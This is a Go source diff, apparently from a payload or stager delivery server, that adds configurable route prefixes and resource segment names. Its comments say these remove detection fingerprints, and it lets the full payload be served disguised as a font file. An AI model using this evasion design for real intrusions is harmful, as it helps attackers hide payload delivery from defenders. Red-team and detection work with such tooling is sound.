@@ -355,6 +355,16 @@ type DeliveryConfig struct {
 	CORSAllowOrigin string `json:"cors_allow_origin" yaml:"cors_allow_origin" env:"CORS_ALLOW_ORIGIN" default:""`
 	// 信任的反代头（X-Forwarded-Proto / X-Forwarded-Host）用于日志与可选 URL 推断
 	TrustProxyHeaders bool `json:"trust_proxy_headers" yaml:"trust_proxy_headers" env:"TRUST_PROXY_HEADERS" default:"true"`
+	// 公开投递路径前缀（默认 /d）。改成 /cdn/pkg 之类可以去掉最明显的 /d/ 指纹；
+	// 修改后旧 URL 不再可用，需要重新生成载荷。
+	RoutePrefix string `json:"route_prefix" yaml:"route_prefix" env:"ROUTE_PREFIX" default:"/d"`
+	// 资源段名（默认 full/stager/sc/woff）。改掉这些名字可以去掉固定资源路径指纹。
+	FullSegment   string `json:"full_segment" yaml:"full_segment" env:"FULL_SEGMENT" default:"full"`
+	StagerSegment string `json:"stager_segment" yaml:"stager_segment" env:"STAGER_SEGMENT" default:"stager"`
+	ScSegment     string `json:"sc_segment" yaml:"sc_segment" env:"SC_SEGMENT" default:"sc"`
+	WoffSegment   string `json:"woff_segment" yaml:"woff_segment" env:"WOFF_SEGMENT" default:"woff"`
+	// 完整载荷默认 Content-Type（空=按系统自动：Windows font/woff，其它 octet-stream）
+	FullContentType string `json:"full_content_type" yaml:"full_content_type" env:"FULL_CONTENT_TYPE" default:""`
 }
 
 // OpsecConfig 载荷生成期的 OPSEC 默认值（config.json 的 opsec 段）。
@@ -858,6 +868,40 @@ func DeliverySettings() (delivery DeliveryConfig, externalIP string, serverPort 
 	GlobalConfig.mu.RLock()
 	defer GlobalConfig.mu.RUnlock()
 	return GlobalConfig.config.Delivery, GlobalConfig.config.Server.ExternalIP, GlobalConfig.config.Server.Port
+}
+
+// DeliveryRoutePrefix 返回规范化后的投递路径前缀（以 / 开头、无结尾 /）。
+// 供 Hub、主路由、审计与隐藏入口共用，避免各写一份硬编码 "/d/"。
+func DeliveryRoutePrefix() string {
+	p := ""
+	if GlobalConfig != nil {
+		GlobalConfig.mu.RLock()
+		p = GlobalConfig.config.Delivery.RoutePrefix
+		GlobalConfig.mu.RUnlock()
+	}
+	p = strings.TrimSpace(p)
+	if p == "" || p == "/" {
+		return "/d"
+	}
+	if !strings.HasPrefix(p, "/") {
+		p = "/" + p
+	}
+	p = strings.TrimRight(p, "/")
+	// 防呆：与主路由/静态资源冲突的前缀会让 gin 注册 catch-all 时 panic，直接回退 /d
+	for _, reserved := range []string{"/api", "/login", "/static", "/css", "/js", "/img", "/favicon.ico", "/metrics"} {
+		if p == reserved || strings.HasPrefix(p, reserved+"/") {
+			return "/d"
+		}
+	}
+	// gin 的 catch-all 模式不接受 * : 等字符；只放行常规 URL 段字符
+	for _, r := range p {
+		if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') ||
+			r == '/' || r == '-' || r == '_' || r == '.' || r == '~' {
+			continue
+		}
+		return "/d"
+	}
+	return p
 }
 
 // StorageDownloadsDir 返回下载制品根目录（值拷贝，下载热路径专用）。
